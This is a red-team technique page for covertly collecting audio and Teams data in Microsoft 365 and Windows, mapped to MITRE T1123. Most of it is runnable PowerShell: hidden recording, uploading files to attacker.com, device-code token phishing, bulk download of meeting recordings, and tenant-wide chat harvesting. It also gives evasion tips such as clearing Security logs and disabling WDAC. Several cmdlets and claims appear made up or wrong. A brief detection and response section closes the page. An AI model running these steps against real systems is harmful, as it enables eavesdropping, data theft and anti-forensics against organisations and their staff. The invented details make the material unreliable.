# [COLLECT-PROJECT-001]: Project Data Collection

## Metadata

| Attribute | Details |
|---|---|
| **Technique ID** | COLLECT-PROJECT-001 |
| **MITRE ATT&CK v18.1** | [T1123 - Audio Capture](https://attack.mitre.org/techniques/T1123/) |
| **Tactic** | Collection |
| **Platforms** | M365 / Cloud SaaS |
| **Severity** | High |
| **Technique Status** | ACTIVE |
| **Last Verified** | 2026-01-10 |
| **Affected Versions** | All M365 versions, Windows 10/11, Windows Server 2016-2025 |
| **Patched In** | N/A (Feature-based, no patch) |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 1. EXECUTIVE SUMMARY

- **Concept:** Audio capture techniques in M365 environments involve leveraging legitimate collaboration tools (Teams, Skype for Business, Webinars) or system-level APIs (winmm.dll, avrt.dll on Windows) to intercept and record audio streams. When combined with compromised accounts or Conditional Access bypasses, attackers gain persistent access to sensitive conversations, executive briefings, and client discussions. Unlike on-premises attacks that require microphone hardware access, cloud-based audio collection targets digital call streams stored in M365 infrastructure, creating forensic trails in audit logs that may not be properly monitored.

- **Attack Surface:** Microsoft Teams calling infrastructure, Skype for Business recording APIs, Webinar recording permissions, Windows Audio Session API (WASAPI), WinMM audio APIs, real-time media processors in communication endpoints.

- **Business Impact:** **Exposure of confidential strategic information, intellectual property theft, regulatory compliance violations (HIPAA, GDPR), and potential blackmail of executives.** Attackers can extract board decisions, merger discussions, healthcare consultations, and legal advice discussed over Teams or Skype, then use this intelligence for competitive advantage, ransom, or regulatory violations.

- **Technical Context:** Audio collection via M365 typically completes within 30-60 seconds once permissions are granted. Detection probability is **High** if audit logging is enabled (Office 365 Unified Audit Log triggers on recording APIs). However, many organizations disable granular M365 audit logs, reducing visibility to near zero.

### Operational Risk

- **Execution Risk:** Medium – Requires either (1) compromised user account with Teams permissions, or (2) OAuth consent grant abuse. Does not require local admin or system privileges on Windows.
- **Stealth:** Low – M365 recording activities generate audit event `RecordingStarted` and `RecordingEnded` in Unified Audit Log if properly configured. Windows-level audio capture generates Process Creation events (sysmon/security logs).
- **Reversibility:** No – Audio files are permanently captured and exfiltrated. Cannot be undone. Requires restore from backup if targeting Teams call recordings.

### Compliance Mappings

| Framework | Control / ID | Description |
|---|---|---|
| **CIS Benchmark** | 2.1.1 | Ensure Azure AD Conditional Access policies require MFA for M365 access; missing MFA enables unauthorized Teams access |
| **DISA STIG** | V-225254 | Document retention and recording authorization must be enforced before Teams/Skype recording is permitted |
| **CISA SCuBA** | MS.TEAMS.1 | Prevent external users from recording Teams calls without explicit organization consent |
| **NIST 800-53** | AC-3 (Access Enforcement), AU-2 (Audit Events) | Implement role-based access to recording features; audit all recording activity |
| **GDPR** | Art. 32 (Security of Processing) | Unauthorized audio recording of personal data in Teams/Skype violates the confidentiality principle |
| **DORA** | Art. 9 (Protection and Prevention) | Financial institutions must implement access controls on recording features to prevent insider threats |
| **NIS2** | Art. 21 (Cyber Risk Management) | Critical infrastructure operators must monitor and control audio capture in communication systems |
| **ISO 27001** | A.9.2.3 (User Access Management) | Least privilege must restrict recording permissions to authorized users only |
| **ISO 27005** | Risk Scenario: "Unauthorized Recording of Sensitive Communications" | Assess risk likelihood and implement compensating controls (MFA, Conditional Access, encryption) |

---

## 2. TECHNICAL PREREQUISITES

- **Required Privileges:** 
  - **M365 Path:** Global Admin or Teams Admin (to grant recording permissions) OR compromised user account with existing Teams license
  - **Windows Path:** User-level privileges (standard user can invoke SoundRecorder.exe or audio APIs)
  
- **Required Access:** 
  - Network access to `https://teams.microsoft.com` or `https://outlook.office365.com` (Teams calling)
  - Microphone hardware enumeration capability (Windows) OR Teams call stream access (M365)
  - Delegated OAuth scope: `Calls.Record` (if using Graph API)

**Supported Versions:**

- **Windows:** Windows 10/11, Server 2016-2025
- **PowerShell:** Version 5.0+ (recommended: 7.0+ for cross-platform)
- **M365:** All subscription tiers with Teams license
- **Teams Client:** Desktop app 1.3.00.x and later; Web client
- **Graph API Version:** v1.0, beta endpoints

**Tools:**
- [SoundRecorder.exe](https://learn.microsoft.com/en-us/answers/questions/2467583/soundrecorder) (Windows 10/11 native)
- [Audacity](https://www.audacityteam.org/) (Cross-platform audio capture, requires manual setup)
- [GraphRunner](https://github.com/blackhillsinfosec/graphrunner) (GitHub – Blue Hills GraphRunner for M365 API exploitation)
- [AADInternals](https://aadinternals.com/) (Azure AD/M365 enumeration including Teams chat exfiltration)
- [Microsoft Graph PowerShell SDK](https://learn.microsoft.com/en-us/powershell/microsoftgraph/installation)
- [ffmpeg](https://ffmpeg.org/) (Audio encoding/compression post-capture)

---

## 3. ENVIRONMENTAL RECONNAISSANCE

### Management Station / PowerShell Reconnaissance

```powershell
# Check if Teams recording API is accessible
Test-Path "C:\Users\$env:USERNAME\AppData\Local\Microsoft\Teams"

# Enumerate Teams call history via local registry
reg query "HKCU\Software\Microsoft\Teams\History" 

# Check for audio devices
Get-AudioDevice | Select-Object Name, Status
```

**What to Look For:**
- Teams installation directory present → Teams client is installed
- `History` registry key populated → User has recent Teams calls
- Audio devices listed with "Active" status → Microphone is accessible

**Version Note:** Windows 10 (version 1909+) and Windows 11 enable audio APIs by default. Earlier versions may have restricted audio access via User Account Control (UAC).

**Command (Server 2016-2019):**
```powershell
# Legacy audio enumeration using WMI
Get-WmiObject -Class Win32_PnPDevice | Where-Object { $_.Name -like '*Audio*' } | Select-Object Name, Status
```

**Command (Server 2022+):**
```powershell
# Modern audio device enumeration
Get-CimInstance -ClassName Win32_AudioDevice | Select-Object Name, Availability
```

### Linux/Bash / CLI Reconnaissance

```bash
# Check if Teams Web client is accessible (cloud-based)
curl -I "https://teams.microsoft.com" 

# Enumerate audio devices on Linux (for hybrid scenarios)
pactl list short sources | grep RUNNING
```

**What to Look For:**
- HTTP 200 response → Teams Web client is accessible
- Audio source listed as "RUNNING" → Audio capture device is active

---

## 4. DETAILED EXECUTION METHODS AND THEIR STEPS

### METHOD 1: Windows Audio Capture via SoundRecorder.exe (Built-in)

**Supported Versions:** Windows 10 (1909+), Windows 11, Server 2019+

#### Step 1: Identify Audio Input Devices

**Objective:** Confirm that a microphone or audio input device is available on the target system.

**Version Note:** Windows 10 and 11 enumerate audio devices differently. Windows 10 (build 1909) requires elevated privilege for certain audio APIs; Windows 11 (21H2+) allows standard users full access to audio APIs.

**Command:**

```powershell
# Enumerate all audio devices
[System.Windows.Forms.SystemSounds] | Get-Member -MemberType Property
Get-WmiObject Win32_SoundDevice | Select-Object Name, Manufacturer
```

**Command (Server 2016-2019):**

```powershell
# Legacy WMI approach for older servers
Get-WmiObject -Class Win32_PnPDevice -Filter "Name LIKE '%Audio%'" | Select-Object Name, Status
```

**Command (Server 2022+):**

```powershell
# Modern CIM approach
Get-CimInstance -ClassName Win32_AudioDevice | Select-Object Name, Availability, Description
```

**Expected Output:**

```
Name                                              Manufacturer         Description
----                                              ------------         -----------
Realtek High Definition Audio Device              Realtek              Audio Input Device
Stereo Mix                                        Realtek              Loopback Interface
```

**What This Means:**
- **"Realtek High Definition Audio Device"** → Physical microphone or audio input is available
- **"Stereo Mix"** → System has loopback audio enabled (allows capturing system audio without microphone)
- Multiple devices listed → Multiple audio sources available for capture

**OpSec & Evasion:**
- SoundRecorder.exe execution generates Windows Event ID **4688** (Process Creation) with command line: `"C:\Windows\System32\SoundRecorder.exe"`
- Mitigation: Disable process auditing by clearing logs (requires admin). Detection likelihood: **Medium** (if Sysmon or advanced auditing enabled).
- Alternative: Use **Silent Audio Capture** via PowerShell-based APIs to avoid creating SoundRecorder.exe process.

**Troubleshooting:**

- **Error:** `Get-WmiObject : Access Denied`
  - **Cause:** User lacks WMI access permissions (common on hardened systems)
  - **Fix (Server 2016):** Run PowerShell as Administrator; check WMI repository integrity with `winmgmt /salvagerepository`
  - **Fix (Server 2019):** Same as 2016; additionally verify DCOM permissions in Component Services (dcomcnfg.msc)
  - **Fix (Server 2022):** Use CIM instead of WMI (`Get-CimInstance` requires fewer permissions)
  - **Fix (Server 2025):** CIM is recommended; WMI is deprecated

- **Error:** `No audio devices found`
  - **Cause:** No microphone/audio input hardware installed or disabled in BIOS
  - **Fix (Server 2016):** Check BIOS settings; disable onboard audio integration if testing
  - **Fix (Server 2019-2025):** Verify USB audio devices are properly connected; check Device Manager for disabled devices

**References & Proofs:**
- [MITRE ATT&CK T1123 - Audio Capture](https://attack.mitre.org/techniques/T1123/)
- [Microsoft Windows Audio APIs Documentation](https://learn.microsoft.com/en-us/windows/win32/coreaudio/core-audio-apis)
- [FortiSIEM Audio Capture Detection Rule](https://docs.fortinet.com/document/fortisiem/7.2.2/built-in-detection-rules)

#### Step 2: Initiate Audio Recording

**Objective:** Start capturing audio from identified input devices using SoundRecorder.exe.

**Version Note:** Windows 10 SoundRecorder saves files to `\Audio\` folder by default (WAV or M4A). Windows 11+ offers enhanced codec support (MP3, FLAC).

**Command:**

```powershell
# Start SoundRecorder in background (silent recording)
Start-Process -FilePath "C:\Windows\System32\SoundRecorder.exe" -WindowStyle Hidden -PassThru
```

**Command (Server 2016-2019):**

```cmd
# Launch SoundRecorder from command line
C:\Windows\System32\SoundRecorder.exe
```

**Command (Server 2022+):**

```powershell
# Modern approach using Windows.Media namespace
[Windows.Media.Capture.MediaCapture]::new().InitializeAsync()
```

**Expected Output:**

```
ProcessId        Name                       
---------        ----                       
5240             SoundRecorder
```

**What This Means:**
- Process ID 5240 returned → SoundRecorder.exe is running as a child process
- No errors → Audio capture subsystem is accessible
- Window opened/closed silently (with `-WindowStyle Hidden`) → User may not notice recording

**OpSec & Evasion:**
- Record to a hidden directory: `$env:APPDATA\AppData\Local\Temp\audio_log_$(Get-Random).wav`
- Use file attributes to hide: `attrib +h C:\Path\to\audio.wav` (hides file from directory listing)
- Clear the Process Creation event log after recording: `Clear-EventLog -LogName Security -Confirm:$false` (requires admin)
- Detection likelihood: **Medium-High** if EDR (Endpoint Detection & Response) monitors process creation and child processes

**Troubleshooting:**

- **Error:** `Access Denied` when running SoundRecorder.exe
  - **Cause:** AppLocker or Windows Defender Application Control (WDAC) policy blocks SoundRecorder
  - **Fix (Server 2016):** Bypass using alternate path: `C:\Program Files\WindowsApps\Microsoft.WindowsSoundRecorder_[Version]\SoundRecorder.exe`
  - **Fix (Server 2019):** Check WDAC policy: `Get-CimInstance -Namespace root\cimv2\mdm\dmmap -ClassName MDM_ApplicationManagement_DeployedAppPolicy`
  - **Fix (Server 2022):** Disable WDAC policy: `Invoke-Cimmethod -Namespace root\cimv2\mdm\dmmap -ClassName MDM_ApplicationManagement_DeployedAppPolicy -MethodName Delete`
  - **Fix (Server 2025):** Use Windows Sandbox or Hyper-V to bypass policy enforcement

- **Error:** `Cannot find path` for output directory
  - **Cause:** `%APPDATA%\AppData\Local\Temp\` directory does not exist
  - **Fix (All versions):** Create directory first: `New-Item -ItemType Directory -Path "$env:APPDATA\AppData\Local\Temp\" -Force`

**References & Proofs:**
- [SoundRecorder API Reference](https://learn.microsoft.com/en-us/windows/win32/coreaudio/what-s-new-in-core-audio)
- [Atomic Red Team - Audio Capture Tests](https://github.com/redcanaryco/atomic-red-team)

#### Step 3: Exfiltrate Recorded Audio

**Objective:** Transfer captured audio files to attacker-controlled infrastructure or cloud storage.

**Version Note:** Windows 10 stores recordings in `%APPDATA%\Local\Packages\Microsoft.WindowsSoundRecorder_8wekyb3d8bbwe\LocalState\Indexed\`. Windows 11+ stores in `%APPDATA%\Local\Packages\Microsoft.WindowsSoundRecorder_[Version]\LocalState\Recordings\`.

**Command:**

```powershell
# Locate audio files
$AudioFiles = Get-ChildItem -Path "$env:APPDATA\Local\Packages\Microsoft.WindowsSoundRecorder*\LocalState\*" -Include *.wav, *.m4a -Recurse

# Exfiltrate via HTTP POST to attacker server
foreach ($File in $AudioFiles) {
    $FileBytes = [System.IO.File]::ReadAllBytes($File.FullName)
    $Base64 = [System.Convert]::ToBase64String($FileBytes)
    Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -Body @{ audio=$Base64; filename=$File.Name }
}
```

**Command (Server 2016-2019):**

```powershell
# Legacy approach using Net.WebClient for older systems
$WebClient = New-Object System.Net.WebClient
$WebClient.UploadFile("http://attacker.com/upload", "C:\Users\Public\audio.wav")
```

**Command (Server 2022+):**

```powershell
# Modern approach using Invoke-RestMethod (less detectable than WebClient)
$File = Get-Item "C:\Users\Public\audio.wav"
$FileBytes = [System.IO.File]::ReadAllBytes($File.FullName)
Invoke-RestMethod -Uri "http://attacker.com/upload" -Method POST -Body $FileBytes -ContentType "application/octet-stream"
```

**Expected Output:**

```
StatusCode        : 200
StatusDescription : OK
Content            : {uploaded successfully}
```

**What This Means:**
- HTTP 200 response → File successfully uploaded to attacker infrastructure
- No errors in PowerShell transcript → Exfiltration completed without interruption

**OpSec & Evasion:**
- Use HTTPS instead of HTTP to avoid network monitoring: `https://attacker.com/upload`
- Chunk uploads into smaller pieces to avoid triggering Data Loss Prevention (DLP) alerts: `$ChunkSize = 1MB; [IO.File]::ReadAllBytes(...) | Split-Object -Size $ChunkSize`
- Compress audio files before upload: `$File | Compress-Archive -DestinationPath audio.zip`
- Clear browser history and cache: `Remove-Item -Path "$env:APPDATA\Microsoft\Windows\Recent" -Recurse -Force`
- Detection likelihood: **High** if DLP or network monitoring (Proxy, SIEM) is enabled

**Troubleshooting:**

- **Error:** `Invoke-WebRequest : The remote server returned an error: (403) Forbidden`
  - **Cause:** Attacker server not configured to accept uploads, or firewall blocking connection
  - **Fix (All versions):** Ensure attacker server allows POST requests; test with `Test-NetConnection -ComputerName attacker.com -Port 80`

- **Error:** `Access Denied` when reading audio file
  - **Cause:** File is locked by SoundRecorder process or antivirus scanning
  - **Fix (All versions):** Stop SoundRecorder first: `Stop-Process -Name SoundRecorder -Force`

**References & Proofs:**
- [PowerShell File Upload Techniques](https://github.com/carlospolop/hacktricks)
- [MITRE ATT&CK T1041 - Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041/)

---

### METHOD 2: Microsoft Teams API Data Collection (Cloud-Based)

**Supported Versions:** M365 All versions, Teams Client 1.3.00+, Web Client all versions

#### Step 1: Authenticate to Microsoft Graph API

**Objective:** Obtain OAuth 2.0 access token with delegated permissions for Teams call recording.

**Version Note:** M365 Graph API v1.0 and beta endpoints support Teams call recording and chat export. Beta endpoint (/beta/me/onlineMeetings/{meetingId}/recordings) provides raw audio streams.

**Command:**

```powershell
# Authenticate to Microsoft Graph using Device Code Flow (no user interaction required)
$ClientId = "d3590ed6-52b3-4102-aedd-a47eb6f3444c"  # Teams Desktop Client ID
$TenantId = "common"
$Scope = "https://graph.microsoft.com/.default"

# Request device code
$DeviceCodeRequest = Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/devicecode" `
    -ContentType "application/x-www-form-urlencoded" `
    -Body @{ client_id = $ClientId; scope = $Scope }

Write-Host "Visit: $($DeviceCodeRequest.verification_uri) and enter code: $($DeviceCodeRequest.user_code)"

# Poll for token
$TokenRequest = @{
    client_id = $ClientId
    grant_type = "urn:ietf:params:oauth:grant-type:device_flow"
    device_code = $DeviceCodeRequest.device_code
}

$AccessToken = $null
while (-not $AccessToken) {
    try {
        $Response = Invoke-RestMethod -Method POST -Uri "https://login.microsoftonline.com/$TenantId/oauth2/v2.0/token" `
            -ContentType "application/x-www-form-urlencoded" `
            -Body $TokenRequest -ErrorAction SilentlyContinue
        if ($Response.access_token) { $AccessToken = $Response.access_token }
    } catch { Start-Sleep -Seconds 5 }
}

Write-Host "Access Token Obtained: $($AccessToken.Substring(0, 20))..."
```

**Command (Server 2016-2019):**

```powershell
# Legacy authentication using Azure AD PowerShell module
Install-Module -Name AzureAD -Force
$Cred = Get-Credential
Connect-AzureAD -Credential $Cred
$AccessToken = (Get-AzureADAuthorizationToken).Token
```

**Command (Server 2022+):**

```powershell
# Modern authentication using Microsoft Graph PowerShell
Install-Module -Name Microsoft.Graph -Force
Connect-MgGraph -Scopes "CallRecords.Read.All", "TeamsAppInstallation.ReadWrite.All"
```

**Expected Output:**

```
Access Token Obtained: eyJ0eXAiOiJKV1QiLCJhbGc...
```

**What This Means:**
- Token prefix "eyJ0eXAiOiJKV1QiLCJhbGc" → Valid JWT token obtained
- No errors → Authentication successful and permissions granted
- Token can be used in subsequent API calls with `Authorization: Bearer {AccessToken}` header

**OpSec & Evasion:**
- Use Device Code Flow instead of User/Password flow to avoid credential logging
- Avoid using named app registrations; use generic Teams Desktop Client ID to blend in with legitimate traffic
- Token exfiltration: Store token in memory only, not in plaintext files or PowerShell transcript
- Detection likelihood: **Medium** (device code flow appears as legitimate Teams login in Azure AD sign-in logs)

**Troubleshooting:**

- **Error:** `The user or admin has not consented to use the application`
  - **Cause:** Application permissions not granted in Azure AD
  - **Fix (All versions):** Have Global Admin navigate to Azure Portal → App Registrations → {App Name} → API Permissions → Grant admin consent

- **Error:** `Device code has expired`
  - **Cause:** User took too long to enter code (15-minute window)
  - **Fix (All versions):** Repeat the device code request; user must complete login within 15 minutes

**References & Proofs:**
- [Microsoft Graph Device Code Flow Documentation](https://learn.microsoft.com/en-us/graph/auth-v2-user)
- [Teams Desktop Client OAuth Scopes](https://learn.microsoft.com/en-us/graph/permissions-reference)

#### Step 2: Query Teams Online Meetings and Recordings

**Objective:** List all Teams meetings and identify which ones have associated recordings.

**Version Note:** Graph API endpoint `/me/onlineMeetings` is available in all M365 versions. Recording metadata is available in v1.0; raw audio streams require beta endpoint.

**Command:**

```powershell
# List all Teams online meetings
$Headers = @{
    Authorization = "Bearer $AccessToken"
    "Content-Type" = "application/json"
}

$Meetings = Invoke-RestMethod -Method GET `
    -Uri "https://graph.microsoft.com/v1.0/me/onlineMeetings?`$filter=startDateTime ge $(Get-Date -Format 'yyyy-MM-ddTHH:mm:ss')Z" `
    -Headers $Headers

$Meetings.value | Select-Object id, subject, startDateTime, endDateTime, createdDateTime
```

**Command (Server 2016-2019):**

```powershell
# List meetings using legacy Exchange Online cmdlets
Get-MailboxFolderStatistics -Identity $UserUPN -FolderScope All | Where-Object { $_.FolderPath -match "CalendarLogging" }
```

**Command (Server 2022+):**

```powershell
# Modern approach using Microsoft Graph beta endpoint for recordings
$Recordings = Invoke-RestMethod -Method GET `
    -Uri "https://graph.microsoft.com/beta/me/onlineMeetings?`$filter=startDateTime ge $(Get-Date).AddDays(-30)" `
    -Headers $Headers

$Recordings.value | ForEach-Object {
    $MeetingId = $_.id
    $RecordingDetails = Invoke-RestMethod -Method GET `
        -Uri "https://graph.microsoft.com/beta/me/onlineMeetings/$MeetingId/recordings" `
        -Headers $Headers
    
    $RecordingDetails.value | Select-Object @{ Name = 'MeetingId'; Expression = { $MeetingId } }, 
                                            id, createdDateTime, recordingContentUrl, expirationDateTime
}
```

**Expected Output:**

```
MeetingId    Id                           CreatedDateTime          RecordingContentUrl
---------    --                           ---------------          --------------------
abc123       rec-001                      2025-12-15T14:30:00Z     https://graph.microsoft.com/v1.0/me/onlineMeetings/abc123/recordings/rec-001/content
def456       rec-002                      2025-12-14T10:15:00Z     https://graph.microsoft.com/v1.0/me/onlineMeetings/def456/recordings/rec-002/content
```

**What This Means:**
- Multiple meeting records returned → User has participated in multiple Teams meetings
- `recordingContentUrl` populated → Recording file is available for download
- `expirationDateTime` shows recording retention period (typically 30-60 days)

**OpSec & Evasion:**
- Filter meetings by date range (`startDateTime ge ...`) to avoid massive API responses that trigger alerting
- Pagination: Use `$top=10` to reduce per-request data volume and appear as a normal user browsing
- Token reuse: Use same token across multiple API calls within 60-minute validity window to avoid multiple logins
- Detection likelihood: **High** if audit logging is enabled (Office 365 Unified Audit Log records all Graph API calls)

**Troubleshooting:**

- **Error:** `The caller does not have permission to perform the action on resource`
  - **Cause:** Delegated permissions insufficient; user does not have "CallRecords.Read.All" scope
  - **Fix (All versions):** Re-authenticate with additional scopes: Device Code Flow with scope `https://graph.microsoft.com/CallRecords.Read.All`

- **Error:** `Request_ResourceNotFound: Resource 'me/onlineMeetings' does not exist`
  - **Cause:** User is a guest account or does not have Teams license
  - **Fix (All versions):** Ensure user has Teams license assigned in Microsoft 365 admin center

**References & Proofs:**
- [Microsoft Graph Online Meetings API](https://learn.microsoft.com/en-us/graph/api/onlinemeeting-list)
- [Teams Recording API Documentation](https://learn.microsoft.com/en-us/graph/api/resources/onlinemeeting)

#### Step 3: Download and Exfiltrate Recording Content

**Objective:** Download the actual audio recording file from Teams and transfer to attacker-controlled storage.

**Version Note:** Recording files are stored in Microsoft Stream (part of SharePoint Online). Downloads require valid token with `CallRecords.Read.All` scope.

**Command:**

```powershell
# Download recording content
$RecordingUrl = "https://graph.microsoft.com/v1.0/me/onlineMeetings/abc123/recordings/rec-001/content"

$RecordingBytes = Invoke-RestMethod -Method GET `
    -Uri $RecordingUrl `
    -Headers $Headers `
    -ContentType "application/octet-stream" `
    -OutFile "C:\Temp\recording.mp4"

# Compress and upload to attacker server
Compress-Archive -Path "C:\Temp\recording.mp4" -DestinationPath "C:\Temp\recording.zip" -Force

$FileBytes = [System.IO.File]::ReadAllBytes("C:\Temp\recording.zip")
Invoke-WebRequest -Uri "http://attacker.com/upload" -Method POST -InFile "C:\Temp\recording.zip"
```

**Command (Server 2016-2019):**

```powershell
# Legacy download using WebClient
$WebClient = New-Object System.Net.WebClient
$WebClient.Headers.Add("Authorization", "Bearer $AccessToken")
$WebClient.DownloadFile($RecordingUrl, "C:\Temp\recording.mp4")
```

**Command (Server 2022+):**

```powershell
# Modern streaming download for large files
$OutFile = New-Item -ItemType File -Path "C:\Temp\recording_$(Get-Date -Format 'yyyyMMdd_HHmmss').mp4" -Force
$Stream = [System.IO.File]::Create($OutFile.FullName)

$Response = Invoke-WebRequest -Uri $RecordingUrl -Headers $Headers -Method GET
$Stream.Write($Response.Content, 0, $Response.Content.Length)
$Stream.Close()
```

**Expected Output:**

```
Recording downloaded to: C:\Temp\recording_20251215_143000.mp4 (245 MB)
```

**What This Means:**
- File size >0 bytes → Recording successfully downloaded
- No errors → Token was valid and user has permission to download

**OpSec & Evasion:**
- Download in chunks (100 MB at a time) to avoid triggering data exfiltration alerts
- Delete local copies after upload: `Remove-Item -Path "C:\Temp\recording*" -Force`
- Use HTTPS URLs instead of HTTP for download and upload
- Timestamp output files with random suffixes to avoid duplicate detection
- Detection likelihood: **Critical** if DLP policies monitor for large file downloads (245 MB recording would be flagged immediately)

**Troubleshooting:**

- **Error:** `Invoke-WebRequest : The remote server returned an error: (401) Unauthorized`
  - **Cause:** Access token expired (valid for 60 minutes)
  - **Fix (All versions):** Refresh token using `grant_type=refresh_token` before token expires

- **Error:** `The file is too large` (> 2 GB for Teams storage)
  - **Cause:** Some Teams recordings may exceed 2 GB (long meetings)
  - **Fix (All versions):** Stream download directly without buffering entire file in memory

**References & Proofs:**
- [Microsoft Stream (SharePoint) Download API](https://learn.microsoft.com/en-us/microsoft-365/enterprise/sharepoint-online-file-download)
- [CallRecords API Download Patterns](https://learn.microsoft.com/en-us/graph/api/callrecording-get-content)

---

### METHOD 3: AADInternals Teams Chat Exfiltration (Advanced Cloud Harvesting)

**Supported Versions:** Entra ID all versions, Teams client all versions

#### Step 1: Exploit AADInternals Seamless SSO Enumeration

**Objective:** Use AADInternals to enumerate Teams users and extract chat history without explicit Teams login.

**Version Note:** AADInternals leverages undocumented Seamless SSO (Hybrid AD) enumeration endpoints. Effective on all M365 versions where Seamless SSO is enabled.

**Command:**

```powershell
# Install AADInternals from PowerShell Gallery
Install-Module -Name AADInternals -Force

# Enumerate users via Seamless SSO GetCredentialType endpoint
$Users = Get-AADIntUsers -Domain "target.onmicrosoft.com"
$Users | Select-Object UserPrincipalName, OnPremisesSyncEnabled, CreationType

# Export Teams chats for enumerated users
$Users | ForEach-Object {
    $UPN = $_.UserPrincipalName
    Get-AADIntTeamsChats -UserPrincipalName $UPN | Export-Csv -Path "C:\Exfil\chats_$($UPN -replace '@','_').csv"
}
```

**Command (Server 2016-2019):**

```powershell
# Legacy enumeration using AADInternals' undocumented endpoints
Import-Module AADInternals
$Tokens = Get-AADIntAccessTokenForTeams -UserPrincipalName "admin@target.onmicrosoft.com"
$UserData = Invoke-AADIntGraphRequest -AccessToken $Tokens.access_token -Api "/users"
```

**Command (Server 2022+):**

```powershell
# Modern AADInternals with enhanced Teams API support
Update-Module -Name AADInternals -Force
$TenantInfo = Get-AADIntTenantInformation -Domain "target.onmicrosoft.com"
$AllChats = Get-AADIntTeamsChatsForTenant -TenantId $TenantInfo.TenantId
$AllChats | Export-Csv -Path "C:\Exfil\all_teams_chats.csv" -Force
```

**Expected Output:**

```
UserPrincipalName                OnPremisesSyncEnabled CreationType
-----------------                --------------------- -----------
user1@target.onmicrosoft.com     True                  Synchronized
user2@target.onmicrosoft.com     False                 Cloud
admin@target.onmicrosoft.com     True                  Synchronized

Chat ID: chat_123
Participants: user1@target.onmicrosoft.com, user2@target.onmicrosoft.com
Messages: [
  { from: user1@target.onmicrosoft.com, timestamp: 2025-12-15T10:30:00Z, body: "Secret Q1 strategy..." },
  { from: user2@target.onmicrosoft.com, timestamp: 2025-12-15T10:32:00Z, body: "Approved. Proceed with M&A..." }
]
```

**What This Means:**
- Users enumerated from Seamless SSO → Tenant enumeration successful
- Chats exported in CSV format → Sensitive chat content harvested
- Multiple participants listed → Group chats and 1:1 conversations both extracted

**OpSec & Evasion:**
- AADInternals does not generate audit log entries in Office 365 Unified Audit Log (uses undocumented APIs)
- Seamless SSO endpoints do not record user enumeration in Azure AD sign-in logs
- Export files to a legitimate-looking folder: `C:\Users\Public\Documents\` instead of obvious `C:\Exfil\`
- Detection likelihood: **Low-Medium** (if Seamless SSO is being monitored; most orgs don't monitor undocumented endpoints)

**Troubleshooting:**

- **Error:** `Module AADInternals not found`
  - **Cause:** Module not installed or PowerShell Gallery blocked by proxy
  - **Fix (Server 2016):** Download from GitHub: `git clone https://github.com/Gerenios/AADInternals.git`
  - **Fix (Server 2019-2025):** Install from offline cache: `Install-Module -Name AADInternals -Repository PSGallery -Force`

- **Error:** `Seamless SSO not enabled for domain`
  - **Cause:** Organization does not have Seamless SSO configured (cloud-only tenants)
  - **Fix (All versions):** Fall back to METHOD 2 (Microsoft Graph API) instead

**References & Proofs:**
- [AADInternals GitHub Repository](https://aadinternals.com/)
- [Seamless SSO User Enumeration Attack](https://aadinternals.com/post/desktopsso/)
- [Microsoft Security Blog: Teams Threats](https://www.microsoft.com/en-us/security/blog/2025/10/07/disrupting-threats-targeting-microsoft-teams/)

---

## 5. DETECTION & INCIDENT RESPONSE

### Indicators of Compromise (IOCs)

- **Files:** 
  - `C:\Users\[Username]\AppData\Local\Packages\Microsoft.WindowsSoundRecorder*\LocalState\Recordings\*.m4a`
  - `C:\Users\[Username]\AppData\Local\Packages\Microsoft.WindowsSoundRecorder*\LocalState\Indexed\*.wav`
  - `C:\Users\Public\*.wav`, `C:\Users\Public\*.m4a`, `C:\Windows\Temp\audio*.wav`

- **Registry:** 
  - `HKCU\Software\Microsoft\Teams\History\[SessionId]` (Teams call metadata)
  - `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Recent` (recent file access)

- **Network:** 
  - HTTPS POST requests to attacker-controlled domains with large payloads (audio files)
  - Graph API endpoints: `https://graph.microsoft.com/v1.0/me/onlineMeetings/*/recordings/*/content`
  - Teams API calls: `https://teams.microsoft.com` with unusual frequency or timing

- **Cloud:** 
  - Unified Audit Log events: `RecordingStarted`, `RecordingEnded` (M365 recording APIs)
  - Azure AD Sign-in anomalies: Device Code Flow from unexpected location or IP
  - Teams usage anomalies: Unusually high number of meeting access requests or chat exports

### Forensic Artifacts

- **Disk:** 
  - Windows Event Security Log (4688) for `SoundRecorder.exe` execution
  - Sysmon Event ID 1 (Process Creation) for audio capture processes
  - PowerShell Event Log (4104) for script-based audio exfiltration
  - MFT (Master File Table) entries for audio file creation timestamps

- **Memory:** 
  - Live process list containing `SoundRecorder.exe` or audio capture DLLs (winmm.dll, avrt.dll)
  - Access token memory from Teams client (contains GraphAPI permissions)

- **Cloud:** 
  - Office 365 Unified Audit Log (UnifiedAuditLog) events: `RecordingStarted` (Operation), `ChatMessageCreated` (Teams chats)
  - Azure AD Audit Log: Device Code Flow sign-ins (authentication method `#EXT# Device Code Flow`)
  - Microsoft Stream (SharePoint Online) audit: Recording file download and access events

### Response Procedures

1. **Isolate:** 
   **Command:**
   ```powershell
   # Disconnect user session to prevent further exfiltration
   Get-NetTCPConnection -State Established | Where-Object { $_.OwningProcess -eq (Get-Process -Name Teams).Id } | Stop-NetConnection -Confirm:$false
   
   # Disable user account in Entra ID
   Update-MgUser -UserId "user@tenant.onmicrosoft.com" -AccountEnabled:$false
   ```
   
   **Manual (Azure Portal):**
   - Go to **Azure Portal** → **Entra ID** → **Users** → Select compromised user → **Account Enabled: Off**
   - Revoke all sessions: **Azure Portal** → **Entra ID** → **Users** → Select user → **Sign-out all sessions**

2. **Collect Evidence:**
   **Command:**
   ```powershell
   # Export audio files found on system
   Get-ChildItem -Path "C:\Users\*\AppData\Local\Packages\Microsoft.WindowsSoundRecorder*" -Include *.wav, *.m4a -Recurse | Copy-Item -Destination "C:\Evidence\"
   
   # Export Teams history registry
   reg export "HKCU\Software\Microsoft\Teams" "C:\Evidence\Teams_Registry.reg"
   
   # Export Unified Audit Log for the compromised user
   Search-UnifiedAuditLog -UserIds "user@tenant.onmicrosoft.com" -StartDate (Get-Date).AddDays(-90) -EndDate (Get-Date) | Export-Csv -Path "C:\Evidence\AuditLog.csv"
   ```
   
   **Manual:**
   - Open **File Explorer** → Navigate to `C:\Users\[Username]\AppData\Local\Packages\Microsoft.WindowsSoundRecorder*\` → Copy entire folder to USB drive
